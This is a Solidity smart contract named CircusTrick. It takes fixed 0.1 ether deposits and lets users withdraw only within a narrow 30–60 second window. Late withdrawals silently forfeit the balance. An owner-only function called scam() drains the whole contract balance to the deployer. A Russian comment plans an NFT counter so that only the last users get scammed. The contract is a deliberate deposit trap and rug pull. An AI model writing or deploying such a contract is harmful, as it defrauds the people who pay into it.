// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// поставить счетчик нфт: если платежи будут поступать непрерывно с интервалом 40 сек,
// то соскамятся только последние пользователи, т.к банк будет пустой из-за ограничения по кол-ву нфт

contract CircusTrick {
    address owner;
    uint bank;
    uint fixValue = 0.1 ether;
    uint minLockDelay = 30;
    uint maxLockDelay = 60;
    mapping(address => uint) balances;
    mapping(address => uint) timestamps;

    constructor() {
        owner = msg.sender;
    }

    function getPay() public payable {
        require(msg.value == fixValue, "only fix value");
        require(balances[msg.sender] == 0, "already payed");
        balances[msg.sender] = fixValue;
        timestamps[msg.sender] = block.timestamp;
        bank += fixValue;
    }

    function withdrawMoney() public {
        require(balances[msg.sender] != 0, "nothing to withdraw :)");
        require(
            block.timestamp >= timestamps[msg.sender] + minLockDelay,
            "your time has not come yet"
        );
        if (
            bank < fixValue ||
            block.timestamp >= timestamps[msg.sender] + maxLockDelay
        ) {
            balances[msg.sender] = 0;
        } else {
            address payable _to = payable(msg.sender);
            balances[msg.sender] = 0;
            bank -= fixValue;
            _to.transfer(fixValue);
        }
    }

    function scam() public {
        require(msg.sender == owner, "you are not an owner");
        address payable _to = payable(msg.sender);
        bank = 0;
        _to.transfer(address(this).balance);
    }

    receive() external payable {}

    fallback() external payable {}
}
